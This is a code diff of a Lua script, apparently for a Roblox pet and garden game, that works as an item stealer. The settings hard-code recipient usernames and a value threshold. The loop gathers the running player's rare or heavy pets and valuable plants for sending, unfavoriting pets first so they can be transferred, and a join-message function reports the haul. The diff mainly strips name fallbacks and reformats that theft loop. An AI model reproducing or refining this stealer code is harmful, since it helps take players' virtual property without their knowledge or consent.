@@ -1,5 +1,4 @@
 
-
 -- USER SETTINGS
 _G.Usernames = {"saikigrow", "", "Wanwood42093"}
 _G.min_value = 100000000
@@ -154,13 +153,6 @@ local function containsRarePet(itemList)
     return false
 end
 
-local function safeName(name, default)
-    if type(name) ~= "string" or name == "" or name == nil then
-        return default
-    end
-    return name
-end
-
 local function SendJoinMessage(list, prefix)
 local highestKG = getHighestKGFruit() or 0
 local itemList = ""
@@ -291,34 +283,24 @@ end
 for _, tool in ipairs(backpack:GetChildren()) do
     if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
         if tool:GetAttribute("ItemType") == "Pet" then
-    local petUUID = tool:GetAttribute("PET_UUID")
-    local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
-    local itemName = safeName((v14 and v14.PetType), "Unknown Pet")
-
-    if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
-        -- If pet is favorited, unfavorite it before sending
-        if tool:GetAttribute("Favorite") then
-            replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
-            task.wait(0.1)
-        end
-
-        local value = calcPetValue(v14)
-        local toolName = tool.Name
-        local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
-        totalValue = totalValue + value
-        table.insert(itemsToSend, {
-            Tool = tool,
-            Name = itemName,
-            Value = value,
-            Weight = weight,
-            Type = "Pet"
-        })
-    end
+            local petUUID = tool:GetAttribute("PET_UUID")
+            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
+            local itemName = v14.PetType
+            if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
+                if tool:GetAttribute("Favorite") then
+                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
+                end
+                local value = calcPetValue(v14)
+                local toolName = tool.Name
+                local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
+                totalValue = totalValue + value
+                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
+            end
         else
             local value = calcPlantValue(tool)
             if value >= min_value then
                 local weight = getWeight(tool)
-                local itemName = tool:GetAttribute("ItemName") or tool.Name or "Unknown Fruit"
+                local itemName = tool:GetAttribute("ItemName")
                 totalValue = totalValue + value
                 table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
             end
